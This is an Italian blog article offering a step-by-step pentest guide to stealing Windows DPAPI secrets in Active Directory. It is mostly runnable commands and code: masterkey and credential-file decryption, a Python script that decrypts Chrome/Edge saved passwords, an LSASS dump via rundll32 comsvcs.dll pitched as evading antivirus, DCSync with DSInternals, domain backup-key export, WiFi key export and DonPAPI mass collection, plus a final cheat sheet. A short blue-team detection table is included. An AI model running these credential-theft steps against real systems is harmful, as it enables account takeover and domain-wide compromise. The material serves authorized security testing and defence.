---
title: 'DPAPI Attack in Active Directory: Estrarre Password Cifrate e Masterkey'
slug: dpapi
description: 'Guida completa su DPAPI in un pentest Active Directory: masterkey, credential files, Chrome/Edge offline con pypykatz, LSASS dump LOLBin, DSInternals e DonPAPI.'
image: /dpapi.webp
draft: false
date: 2026-03-17T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - domain-backup-key
  - dpapi
---

DPAPI (Data Protection API) è il meccanismo nativo di Windows per cifrare password, token e segreti legati all'identità dell'utente. Browser, Credential Manager, applicazioni di terze parti — tutto passa da qui.

Durante un pentest AD è una delle fonti di credenziali più sottovalutate. Spesso ci si concentra su hash crackati, pass-the-hash, Kerberoasting — e intanto le password in chiaro sono lì, cifrate con DPAPI, che nessuno ha guardato.

Questa guida è operativa: ogni concetto ha il comando corrispondente, verificato e testato.

***

## Tool utilizzati in questa guida

Prima di iniziare, chiariamo quale tool fa cosa — è la fonte di confusione più comune:

| Tool                  | Contesto                   | Cosa fa                                                   |
| --------------------- | -------------------------- | --------------------------------------------------------- |
| `dpapi.py` (impacket) | Linux/Kali offline         | masterkey, credential files, blob raw, vault, backup keys |
| `pypykatz`            | Linux/Kali offline         | masterkey, credential files, **Chrome/Edge passwords**    |
| `SharpDPAPI`          | Windows (da shell)         | tutto in un colpo, preferibile con SYSTEM                 |
| `DonPAPI`             | Linux/Kali remoto          | automatizza tutto il flusso su target multipli            |
| `Mimikatz dpapi::`    | Windows (LSASS in memoria) | dump live, richiede SYSTEM o SeDebugPrivilege             |

> **Nota importante**: `dpapi.py` di impacket **non ha un subcomando `chrome`**. Per le password dei browser usa `pypykatz` o `SharpChromium`.

***

## Come funziona DPAPI — Il flusso completo

Sono sempre 3 pezzi, non puoi saltarne nessuno:

```
Password utente (o domain backup key)
        ↓
Decripta la Masterkey
        ↓
La Masterkey decripta il Blob/Credential file
        ↓
Password in chiaro
```

***

## Cos'è un blob DPAPI

Un blob DPAPI è una sequenza di byte cifrati che nasconde un segreto. Si riconosce dal magic bytes iniziale:

```
01000000d08c9ddf0115d1118c7a00c04fc297eb...
```

Lo trovi in:

* File `.txt`, `.xml`, `.ps1` su share SMB o script di automazione
* Registry (`HKCU\Software\...`)
* Task Scheduler (file XML dei task)
* `SYSVOL` — script GPO lasciati da admin negligenti

### Come trovare blob DPAPI

**Da Windows (shell/WinRM):**

```powershell
# Credential files — prima cosa da controllare sempre
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\

# Cerca blob raw nel filesystem (magic bytes in hex)
findstr /si "01000000d08c9ddf" C:\Scripts\*
findstr /si "01000000d08c9ddf" C:\Windows\System32\Tasks\*
findstr /si "01000000d08c9ddf" \\<DC>\SYSVOL\*
```

**Da Linux (share SMB montato o file scaricati):**

```bash
grep -r "01000000d08c9ddf" . 2>/dev/null
```

***

## Cos'è un Credential file

Il Credential file è il formato strutturato che Windows usa per salvare credenziali (RDP, reti, applicazioni). È un blob DPAPI in formato specifico.

Dove si trovano:

```powershell
dir C:\Users\<utente>\AppData\Local\Microsoft\Credentials\
dir C:\Users\<utente>\AppData\Roaming\Microsoft\Credentials\
```

**Come leggere un Credential file senza chiave** (per capire quale masterkey serve):

```bash
dpapi.py credential -file <CREDFILE>
```

Output:

```
[BLOB]
Guid MasterKey : 7DC6A492-36E2-4C2D-BE66-BA29D263DDA2   ← questo ti serve
Description    : Local Credential Data
```

Il campo `Guid MasterKey` ti dice esattamente quale masterkey devi decriptare.

***

## Cos'è una Masterkey

La masterkey è la chiave che decripta il blob. Ogni utente ne ha una o più, salvate qui:

```
C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\
```

```powershell
dir -Force C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\
```

Output tipico:

```
7dc6a492-36e2-4c2d-be66-ba29d263dda2   ← masterkey
847764c9-8c17-4732-ae85-438159038c97   ← altra masterkey
BK-DOMINIO                              ← backup cifrato con chiave RSA del DC
Preferred                               ← punta alla masterkey attiva
```

### Come capire quale masterkey usare

**Metodo 1 — Leggi il Credential file** (il più preciso):

```bash
dpapi.py credential -file <CREDFILE>
# Guarda il campo "Guid MasterKey"
```

**Metodo 2 — Leggi il file Preferred**:

```powershell
Format-Hex .\Preferred
# I primi 16 byte in little-endian sono il GUID della masterkey attiva
```

> Attenzione: `Preferred` punta all'ultima masterkey aggiornata, ma il blob può essere stato cifrato con una più vecchia. Il Metodo 1 è sempre più affidabile.

### File speciali nella cartella Protect

| File          | Cosa è                                                    |
| ------------- | --------------------------------------------------------- |
| `<GUID>`      | Masterkey dell'utente                                     |
| `Preferred`   | Punta alla masterkey attiva (aggiornata ogni \~90 giorni) |
| `BK-<DOMAIN>` | Backup cifrato con la chiave RSA del DC                   |

***

## TL;DR — Cosa ti serve per iniziare

| Hai              | Fai                                               |
| ---------------- | ------------------------------------------------- |
| Password utente  | Tecnica 1                                         |
| Hash NTLM utente | Tecnica 5                                         |
| Domain Admin     | Tecnica 3 (domain backup key) — decripti chiunque |
| SYSTEM sul box   | Tecnica 4 (SharpDPAPI) — tutto in un colpo        |

***

## Tecnica 1 — Decriptare DPAPI con Password Utente (impacket)

### Step 1 — Trova i Credential files

```powershell
dir C:\Users\<utente>\AppData\Local\Microsoft\Credentials\
dir C:\Users\<utente>\AppData\Roaming\Microsoft\Credentials\
```

### Step 2 — Leggi il Credential file per trovare il GUID della masterkey

```bash
dpapi.py credential -file <CREDFILE>
# Annota il campo "Guid MasterKey"
```

### Step 3 — Recupera SID e scarica la masterkey

```powershell
whoami /user
# → S-1-5-21-XXXX-XXXX-XXXX-YYYY

# Download da Evil-WinRM
download "C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID-masterkey>"
```

### Step 4 — Decripta la masterkey

```bash
dpapi.py masterkey \
  -file <GUID-masterkey> \
  -sid <SID> \
  -password <PASSWORD>
```

Output:

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0x32f235f8680f61b2886a31ab60651161...
```

### Step 5 — Decripta il Credential file

```bash
dpapi.py credential -file <CREDFILE> -key 0x<MASTERKEY-DECRIPTATA>
```

Output:

```
[CREDENTIAL]
Target   : Domain:target=FILESERVER01
Username : DOMAIN\administrator
Password : P@ssw0rd123
```

***

## Tecnica 2 — Blob DPAPI raw (da script, registry, file)

Se trovi un blob come stringa hex in uno script PowerShell o in un file XML:

```bash
# Converti da hex a binario
xxd -r -p blob.txt blob.bin

# Leggi il blob per trovare il GUID della masterkey
dpapi.py unprotect -file blob.bin
# → annota "Guid MasterKey"

# Decripta la masterkey (stesso flusso Tecnica 1)
dpapi.py masterkey -file <GUID> -sid <SID> -password <PASSWORD>

# Decripta il blob
dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY-DECRIPTATA>
```

> L'output può essere in UTF-16LE — ogni carattere ha `00` dopo. Leggilo saltando i byte nulli.

***

## Tecnica 3 — Domain Backup Key (senza password utente)

Il DC ha un backup di tutte le masterkey del dominio, cifrato con la sua chiave RSA privata. Con accesso come Domain Admin, puoi decriptare le masterkey di **qualsiasi utente** del dominio senza conoscerne la password.

```bash
# Step 1 — Esporta la domain backup key
dpapi.py backupkeys -t DOMINIO/Administrator:Password@<DC_IP> --export
# → G$BCKUPKEY_<GUID>.pvk

# Step 2 — Decripta qualsiasi masterkey utente
dpapi.py masterkey \
  -file <GUID-masterkey> \
  -sid <SID> \
  -pvk G$BCKUPKEY_<GUID>.pvk

# Step 3 — Decripta il blob/credential file (stesso flusso Tecnica 1 Step 5)
```

***

## Tecnica 4 — SharpDPAPI (da shell con privilegi)

Se hai shell privilegiata sul target, SharpDPAPI fa tutto in un colpo senza dover scaricare file manualmente:

```powershell
# Decripta tutti i Credential files dell'utente corrente
.\SharpDPAPI.exe credentials

# Con masterkey esplicita
.\SharpDPAPI.exe credentials /mkfile:masterkeys.txt

# Decripta dalla macchina (richiede SYSTEM o SeBackupPrivilege)
.\SharpDPAPI.exe credentials /machine
```

***

## Tecnica 5 — Masterkey con Hash NTLM

Se hai l'hash NTLM ma non la password in chiaro:

```bash
dpapi.py masterkey \
  -file <GUID-masterkey> \
  -sid <SID> \
  -hash aad3b435b51404eeaad3b435b51404ee:<NTHASH>
```

***

## Tecnica 6 — Windows Vault

Il Vault salva credenziali di RDP, reti, applicazioni. Formato diverso dai Credential files.

```powershell
# Elenca vault disponibili
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all

# Scarica i file vault
dir C:\Users\<utente>\AppData\Local\Microsoft\Vault\
dir C:\ProgramData\Microsoft\Vault\
```

```bash
dpapi.py vault \
  -vcrd <file.vcrd> \
  -vpol Policy.vpol \
  -key 0x<MASTERKEY-DECRIPTATA>
```

***

## Tecnica 7 — Chrome / Edge password (pypykatz)

I browser Chromium-based (Chrome, Edge) cifrano le password con DPAPI. Il tool corretto per la decifratura offline da Linux è **pypykatz** — `dpapi.py` di impacket non supporta il formato Chrome/Edge.

```powershell
# Download dei file necessari da Evil-WinRM
download "C:\Users\<utente>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
download "C:\Users\<utente>\AppData\Local\Microsoft\Edge\User Data\Local State"
# Per Chrome: Google\Chrome\User Data\Default\Login Data
#             Google\Chrome\User Data\Local State
```

**Da Kali con pypykatz (metodo offline completo):**

```bash
# Step 1 — Genera le pre-chiavi (SID + password utente)
pypykatz dpapi prekey password <SID> <PASSWORD> -o prekey

# In alternativa con hash NTLM
pypykatz dpapi prekey nt <SID> <NTHASH> -o prekey

# Step 2 — Decripta la masterkey
pypykatz dpapi masterkey \
  <GUID-masterkey-file> \
  prekey \
  -o mkf

# Step 3 — Decripta le password del browser
pypykatz dpapi chrome \
  mkf \
  "Local State" \
  --logindata "Login Data"
```

Output:

```
file: Login Data   user: bob@example.com   pass: b'MyPassword123'   url: https://target.com
```

**Da Windows con SharpChromium** (metodo alternativo, nessuna exfiltrazione richiesta):

```powershell
# Carica SharpChromium in una directory non bloccata da AppLocker
.\SharpChromium.exe logins
```

**Script Python custom (offline, quando hai già la AES key)**

Quando hai già estratto la AES key dall'`os_crypt.encrypted_key` di `Local State` via DPAPI, puoi decriptare il database `Login Data` direttamente senza altri tool. Questo è il metodo più utile quando hai i file esfiltratioffline:

```python
import sqlite3
from Crypto.Cipher import AES

# AES key ricavata da dpapi.py unprotect su Local State (senza prefisso 0x)
aes_key = bytes.fromhex("INSERISCI_QUI_LA_CHIAVE_AES_HEX")

conn = sqlite3.connect("Login Data")
cur  = conn.cursor()
cur.execute("SELECT origin_url, username_value, password_value FROM logins")

for url, user, pwd_enc in cur.fetchall():
    try:
        iv      = pwd_enc[3:15]    # 12 byte nonce GCM (salta prefisso 'v10')
        payload = pwd_enc[15:-16]  # ciphertext
        tag     = pwd_enc[-16:]    # GCM authentication tag

        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        plain  = cipher.decrypt_and_verify(payload, tag)
        print(f"[+] {url}")
        print(f"    user: {user}")
        print(f"    pass: {plain.decode()}")
    except Exception as e:
        print(f"[-] Errore su {url}: {e}")

conn.close()
```

```bash
pip install pycryptodome
python3 decrypt_browser.py
```

Il flusso completo offline:

1. `dpapi.py masterkey` → masterkey decriptata
2. Estrai `os_crypt.encrypted_key` da `Local State`: `cat "Local State" | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['os_crypt']['encrypted_key'])[5:].hex())"`  → blob binario
3. `dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY>` → AES key in hex
4. Script Python sopra con quella AES key → password in chiaro

***

## Tecnica 8 — LSASS Dump Offline con comsvcs.dll (LOLBin)

Dumping LSASS è il modo più diretto per estrarre masterkey DPAPI attive dalla memoria — insieme a hash NTLM, ticket Kerberos e password in chiaro. Il vantaggio di `comsvcs.dll` è che è una DLL **nativa Windows firmata Microsoft**: nessun binario sospetto da caricare, l'analisi la fai offline su Kali.

Per approfondire l'estrazione di credenziali da LSASS con Mimikatz e alternative, leggi il nostro articolo dedicato: [Mimikatz: guida completa all'estrazione di credenziali su Windows](https://hackita.it/articoli/mimikatz/).

**1. Trova il PID di LSASS**

```cmd
tasklist | findstr lsass
# lsass.exe   664   Services   0   15,412 K
```

**2. Dump con comsvcs.dll (LOLBin nativo)**

```cmd
mkdir C:\temp
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 664 C:\temp\lsass.dmp full
```

> Sostituisci `664` con il PID effettivo di LSASS dal comando precedente.

**3. Scarica il dump su Kali**

```cmd
download C:\temp\lsass.dmp
```

**4. Analisi offline con pypykatz**

```bash
pypykatz lsa minidump lsass.dmp
```

**Cosa cercare nell'output:**

| Campo              | Uso                                           |
| ------------------ | --------------------------------------------- |
| Hash NTLM          | Pass-the-hash                                 |
| Password in chiaro | Login diretto                                 |
| Ticket Kerberos    | Pass-the-ticket                               |
| DPAPI masterkey    | Decifrare credential files e password browser |

**Perché comsvcs.dll invece di Mimikatz diretto:**

* DLL nativa Windows firmata Microsoft → non viene bloccata dagli AV tradizionali
* Zero binari esterni da caricare sul target
* L'analisi la fai completamente offline su Kali → nessuna detection in-memory sul target

> **OPSEC**: il processo `rundll32.exe` che accede a LSASS è monitorato da EDR moderni (Sysmon Event ID 10). Su ambienti con EDR avanzato valuta alternative come `NanoDump` o `ProcDump` con PPID spoofing.

***

## Tecnica 9 — Mimikatz da SYSTEM

Se sei SYSTEM e riesci a far girare Mimikatz:

```
# Dump tutte le masterkey dalla memoria LSASS
sekurlsa::dpapi

# Decripta un Credential file
dpapi::cred /in:"C:\Users\<utente>\AppData\Local\Microsoft\Credentials\<CREDFILE>"

# Decripta con masterkey esplicita
dpapi::cred /in:"C:\...\<CREDFILE>" /masterkey:<MASTERKEY-HEX>
```

> Il modulo `dpapi::chrome` di Mimikatz è attualmente broken su versioni moderne del browser — usa SharpChromium o pypykatz.

***

## Tecnica 9 — WiFi password

Le password WiFi sono cifrate con DPAPI di SYSTEM. Se hai privilegi amministrativi:

```powershell
netsh wlan export profile folder=C:\temp key=clear
type C:\temp\Wi-Fi-*.xml | findstr "keyMaterial"
```

Output:

```xml
<keyMaterial>MyWifiPassword123</keyMaterial>
```

***

## Tecnica 10 — Credential Manager (cmdkey)

```powershell
cmdkey /list
```

Se vedi credenziali interessanti, sono nei Credential files — usa Tecnica 1.

***

## Tecnica 11 — Sticky Notes

Spesso dimenticate dagli admin. Cifrate con DPAPI dell'utente.

```powershell
dir "C:\Users\<utente>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\"
download "...\plum.sqlite"
```

```bash
sqlite3 plum.sqlite "SELECT Text FROM Note;"
```

***

## Tecnica 12 — Account di servizio e profili SYSTEM

Gli account di servizio possono avere blob DPAPI associati con credenziali di applicazioni che girano sotto quell'account.

```powershell
dir C:\Windows\ServiceProfiles\*\AppData\Local\Microsoft\Credentials\
dir C:\Windows\ServiceProfiles\*\AppData\Roaming\Microsoft\Credentials\
dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
```

```bash
# Richiede la LSA machine key (da secretsdump o Mimikatz lsadump::lsa /patch)
dpapi.py masterkey -file <GUID> -key <DPAPI-SYSTEM-KEY>
```

***

## Tecnica 13 — PowerShell nativo (no tool esterni)

Se sei nel contesto dell'utente che ha cifrato il blob, Windows può decriptarlo direttamente senza nessun tool da scaricare:

```powershell
(New-Object PSCredential "N/A", (
  "<BLOB-HEX>" | ConvertTo-SecureString
)).GetNetworkCredential().Password
```

Nessun AV da bypassare, nessun binario da caricare. Funziona solo nel contesto dell'utente proprietario del blob.

***

## Tecnica 14 — DonPAPI (automazione remota su target multipli)

DonPAPI v2 automatizza l'intero flusso DPAPI in remoto su uno o più target Windows. Ideale quando hai compromesso molti host e vuoi dumpare tutto senza fare manualmente ogni step.

```bash
# Con password
DonPAPI collect -u <USER> -p <PASSWORD> -d <DOMAIN> -t <IP>

# Con hash NTLM
DonPAPI collect -u <USER> -H <NTHASH> -d <DOMAIN> -t <IP>

# Fetch automatico della domain backup key (DA richiesto)
DonPAPI collect -u Administrator -p <PASSWORD> -d <DOMAIN> -t <IP> --fetch-pvk

# Local admin senza dominio
DonPAPI collect -u Administrator -p <PASSWORD> -t <IP>

# Output su directory specifica
DonPAPI collect -u <USER> -p <PASSWORD> -d <DOMAIN> -t <IP> -o ./output
```

> Con `--fetch-pvk`, DonPAPI recupera automaticamente la Domain Backup Key e la usa per decriptare le masterkey di tutti gli utenti — nessuna password utente necessaria.

***

## Tecnica 15 — DSInternals: DCSync + DPAPI Backup Keys via PowerShell

**DSInternals** è un modulo PowerShell legittimo sviluppato da Michael Grafnetter che espone le API interne di Active Directory. Tra le sue funzionalità c'è `Get-ADReplAccount`, che simula il protocollo MS-DRSR (replication) per estrarre hash NTLM e attributi segreti dal DC — sostanzialmente un DCSync nativo PowerShell.

Per DPAPI è particolarmente utile perché permette anche di estrarre le **domain backup key** via replication, senza passare da `dpapi.py backupkeys`.

### Requisiti

Non richiede Domain Admin — basta il permesso **Replicating Directory Changes** (e Replicating Directory Changes All per gli hash). In molti ambienti questo permesso è assegnato anche ad account non-DA.

```powershell
# Installazione
Install-Module DSInternals -Force

# DCSync su singolo account (quando hai permessi sufficienti)
Get-ADReplAccount -SamAccountName administrator -Server 'dc.domain.com'

# DCSync su tutti gli account del dominio
Get-ADReplAccount -All -Server 'dc.domain.com' -NamingContext 'DC=domain,DC=com'

# Export in formato pwdump per hashcat/john
Get-ADReplAccount -All -Server 'dc.domain.com' -NamingContext 'DC=domain,DC=com' |
  Where-Object { $_.SamAccountType -eq 'User' -and $_.Enabled -eq $true -and $_.NTHash -ne $null } |
  Format-Custom -View HashcatNT |
  Out-File hashes.txt -Encoding ASCII
```

Output di `Get-ADReplAccount` su singolo account:

```
DistinguishedName: CN=Administrator,CN=Users,DC=domain,DC=com
SamAccountName:    administrator
NTHash:            32ed87bdb5fdc5e9cba88547376818d4
LMHash:            
Enabled:           True
```

### DPAPI Backup Keys via replication

```powershell
# Estrae le domain backup key direttamente via MS-DRSR
Get-ADReplBackupKey -Server 'dc.domain.com' | Save-DPAPIBlob -DirectoryPath '.\Output'
```

Genera nella cartella `Output`:

* File `.pvk` — la domain backup key in formato usabile da `dpapi.py masterkey -pvk`
* File `kiwiscript.txt` — comandi Mimikatz pronti per decifrare le masterkey

Combinato con `dpapi.py masterkey -pvk`, puoi decriptare le masterkey di qualsiasi utente del dominio senza conoscerne la password.

> **Detection**: `Get-ADReplAccount -All` genera eventi DRSUAPI sul DC (Event ID 4662 con `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`). Sigma rule dedicata: `Suspicious Get-ADReplAccount`.

***

```powershell
# Credential files
dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\*

# Browser
dir C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data
dir C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

# Blob DPAPI in giro per il filesystem
findstr /si "01000000d08c9ddf" C:\Scripts\*
findstr /si "01000000d08c9ddf" C:\Windows\System32\Tasks\*
findstr /si "01000000d08c9ddf" \\<DC>\SYSVOL\*
```

```bash
# Da Linux su share SMB montato
grep -r "01000000d08c9ddf" . 2>/dev/null
```

***

## Errori comuni

| Errore                              | Causa                                           | Fix                                                                       |
| ----------------------------------- | ----------------------------------------------- | ------------------------------------------------------------------------- |
| `Padding is incorrect`              | Masterkey sbagliata                             | Leggi prima `dpapi.py credential -file <CREDFILE>` e usa il GUID corretto |
| `Unable to decrypt masterkey`       | Password o SID errati                           | Verifica SID con `whoami /user`                                           |
| Output vuoto `[CREDENTIAL]`         | File credenziali di Windows Live                | Cerca altri file                                                          |
| `Cannot find masterkey`             | GUID nel blob non corrisponde ai file scaricati | Scarica tutti i file nella cartella `Protect`                             |
| `Access Denied` su cartella Protect | Non sei l'utente proprietario o non sei SYSTEM  | Usa `SeBackupPrivilege` o SharpDPAPI da SYSTEM                            |
| `dpapi.py chrome: invalid choice`   | Non esiste in impacket                          | Usa `pypykatz dpapi chrome` o SharpChromium                               |

***

## Detection — Blue Team

| Azione                       | Log generato          | Event ID    |
| ---------------------------- | --------------------- | ----------- |
| Accesso a cartella `Protect` | Object Access         | 4663        |
| `dpapi.py backupkeys` sul DC | LSASS access          | 4662        |
| `sekurlsa::dpapi` Mimikatz   | LSASS memory read     | 10 (Sysmon) |
| Export profili WiFi          | `netsh` process spawn | 4688        |
| `DonPAPI` con `--fetch-pvk`  | DCSync / DRSUAPI call | 4662        |

***

## Tool

* [impacket dpapi.py](https://github.com/fortra/impacket) — flusso completo da Linux (tranne Chrome/Edge)
* [pypykatz](https://github.com/skelsec/pypykatz) — alternativa Python a Mimikatz, unico tool Linux con supporto Chrome/Edge
* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — da eseguire su Windows
* [SharpChromium](https://github.com/djhohnstein/SharpChromium) — browser passwords da Windows, utile con AppLocker
* [DonPAPI](https://github.com/login-securite/DonPAPI) — automatizza tutto in remoto su target multipli
* [Mimikatz dpapi::](https://github.com/gentilkiwi/mimikatz) — da SYSTEM in memoria (chrome parser broken su versioni moderne)

***

## Cheat Sheet Finale

```bash
# ── TROVARE I BLOB ─────────────────────────────────────────────
# Credential files
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\

# Blob raw
findstr /si "01000000d08c9ddf" C:\Scripts\*

# ── LSASS DUMP (LOLBin, no tool esterni) ──────────────────────
tasklist | findstr lsass
mkdir C:\temp
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\temp\lsass.dmp full
download C:\temp\lsass.dmp

# Analisi offline
pypykatz lsa minidump lsass.dmp

# ── LEGGERE IL BLOB (trovare GUID masterkey) ───────────────────
dpapi.py credential -file <CREDFILE>
dpapi.py unprotect -file blob.bin

# ── DECRIPTARE LA MASTERKEY ───────────────────────────────────
# Con password utente
dpapi.py masterkey -file <GUID> -sid <SID> -password <PASS>

# Con hash NTLM
dpapi.py masterkey -file <GUID> -sid <SID> -hash aad3b435...<NTHASH>

# Con domain backup key
dpapi.py masterkey -file <GUID> -sid <SID> -pvk <FILE.pvk>

# Con chiave SYSTEM (per profili di servizio)
dpapi.py masterkey -file <GUID> -key <DPAPI_SYSTEM_KEY>

# ── DECRIPTARE IL BLOB/CREDENTIAL ─────────────────────────────
dpapi.py credential -file <CREDFILE> -key 0x<MASTERKEY>
dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY>
dpapi.py vault -vcrd <FILE.vcrd> -vpol Policy.vpol -key 0x<MASTERKEY>

# ── CHROME / EDGE (pypykatz — NON dpapi.py) ───────────────────
pypykatz dpapi prekey password <SID> <PASSWORD> -o prekey
pypykatz dpapi prekey nt <SID> <NTHASH> -o prekey
pypykatz dpapi masterkey <GUID-file> prekey -o mkf
pypykatz dpapi chrome mkf "Local State" --logindata "Login Data"

# Script Python custom (offline, con AES key già estratta)
# pip install pycryptodome
# python3 decrypt_browser.py   ← vedi Tecnica 7 per il codice

# ── DOMAIN BACKUP KEY ─────────────────────────────────────────
dpapi.py backupkeys -t DOMAIN/Admin:Pass@<DC_IP> --export

# DSInternals (PowerShell) — DCSync + backup keys
Install-Module DSInternals -Force
Get-ADReplAccount -SamAccountName administrator -Server 'dc.domain.com'
Get-ADReplAccount -All -Server 'dc.domain.com' -NamingContext 'DC=domain,DC=com'
Get-ADReplBackupKey -Server 'dc.domain.com' | Save-DPAPIBlob -DirectoryPath '.\Output'

# ── AUTOMAZIONE REMOTA ─────────────────────────────────────────
DonPAPI collect -u <USER> -p <PASS> -d <DOMAIN> -t <IP>
DonPAPI collect -u <USER> -H <NTHASH> -d <DOMAIN> -t <IP>
DonPAPI collect -u Administrator -p <PASS> -d <DOMAIN> -t <IP> --fetch-pvk

# ── DA WINDOWS (SharpDPAPI) ────────────────────────────────────
.\SharpDPAPI.exe credentials
.\SharpDPAPI.exe credentials /machine
.\SharpChromium.exe logins
```
